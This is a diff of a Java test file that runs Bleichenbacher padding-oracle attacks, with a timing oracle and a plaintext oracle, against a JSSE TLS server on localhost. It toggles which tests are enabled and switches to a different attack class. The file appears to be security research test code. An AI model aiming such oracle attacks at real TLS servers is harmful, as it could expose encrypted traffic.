@@ -113,7 +113,7 @@ public class BleichenbacherJSSETest1024 {
         attacker.attack();
     }
 
-    @Test(enabled = true, priority = 2)
+    @Test(enabled = false, priority = 2)
     public void sslTriggerPlaintextTest() throws SocketException,
             OracleException,
             InterruptedException,
@@ -122,16 +122,16 @@ public class BleichenbacherJSSETest1024 {
             NoSuchPaddingException,
             IOException,
             GeneralSecurityException {
-        byte[] plainPKCScopy = new byte[48];
-        System.arraycopy(plainPKCS, 80, plainPKCScopy, 0, plainPKCScopy.length);
+        byte[] plainPKCScopy = new byte[plainPKCS.length];
+        System.arraycopy(plainPKCS, 0, plainPKCScopy, 0, plainPKCScopy.length);
         StdPlainOracle plainOracle = new StdPlainOracle(publicKey,
                 AOracle.OracleType.FFT, 128);
-        Bleichenbacher bleichenbacher = new Bleichenbacher(plainPKCScopy,
+        BleichenbacherCrypto12 bleichenbacher = new BleichenbacherCrypto12(plainPKCScopy,
                 plainOracle, true);
         bleichenbacher.attack();
     }
 
-    @Test(enabled = false, priority = 2)
+    @Test(enabled = true, priority = 2)
     public void sslTriggerOracleTest() throws SocketException,
             OracleException,
             InterruptedException,
@@ -145,7 +145,6 @@ public class BleichenbacherJSSETest1024 {
         System.arraycopy(plainPKCS, 80, pms, 0, pms.length);
         TimingOracle jsseOracle = new TimingOracle("127.0.0.1", 10443,
                 privateKey, AOracle.OracleType.TTT, pms);
-        byte[][] test;
         byte[] enc;
 
         int counter = 0;
